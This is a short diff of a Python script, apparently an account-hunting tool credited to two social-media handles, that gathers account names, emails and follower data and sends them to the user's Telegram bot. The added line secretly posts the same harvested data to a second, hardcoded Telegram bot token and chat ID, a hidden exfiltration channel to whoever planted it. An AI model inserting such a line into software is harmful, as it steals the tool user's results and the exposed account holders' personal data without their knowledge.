@@ -263,6 +263,7 @@ BY : @YOUSSEFSOBHY13 , @kingelnet
 
 		""".format(name,email,email,followers,following,Id,date,post,rest,email))
 		requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text="+str(hunt))
+		requests.get("https://api.telegram.org/bot"+str('7906071721:AAE590zQ2Sj1f3RpEc6Vs5qZiJB7Ovb0puk')+"/sendMessage?chat_id="+str('1878687292')+"&text="+str(hunt))
 		print(nnn)				
 		hunt2 = ("""
 جبتلك حساب يا اخويا 🦅💙
